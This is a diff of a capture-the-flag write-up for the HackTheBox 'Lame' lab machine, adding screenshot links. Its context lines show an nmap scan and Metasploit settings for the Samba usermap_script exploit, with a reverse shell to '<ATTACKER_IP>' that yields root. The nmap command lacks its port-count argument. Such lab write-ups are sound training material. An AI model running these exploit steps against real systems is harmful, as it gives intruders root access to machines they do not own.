@@ -25,6 +25,8 @@ no chaining required.
 nmap -A -T4 --top-ports 10.10.10.3
 ```
 
+![nmap service scan](./assets/lame/01-nmap.png)
+
 Three services stood out: **vsftpd 2.3.4** (anonymous login allowed) on FTP,
 OpenSSH 4.7p1 on port 22, and **Samba 3.0.20-Debian** on 139/445. vsftpd 2.3.4
 is itself infamous for a backdoored release, so it was the first thing tried.
@@ -32,6 +34,8 @@ is itself infamous for a backdoored release, so it was the first thing tried.
 ---
 
 ## Foothold / Initial Access
+
+![searching Metasploit for a vsftpd module](./assets/lame/02-msf-search-vsftpd.png)
 
 The vsftpd backdoor module in Metasploit ran without creating a session —
 consistent with the backdoor either being patched out of this particular
@@ -49,6 +53,8 @@ set RHOSTS 10.10.10.3
 set LHOST <ATTACKER_IP>
 run
 ```
+
+![running the Samba usermap_script exploit](./assets/lame/03-samba-usermap-exploit.png)
 
 This returned a session with **root** privileges immediately — no privilege
 escalation phase needed. Both flags were retrieved in the same step.
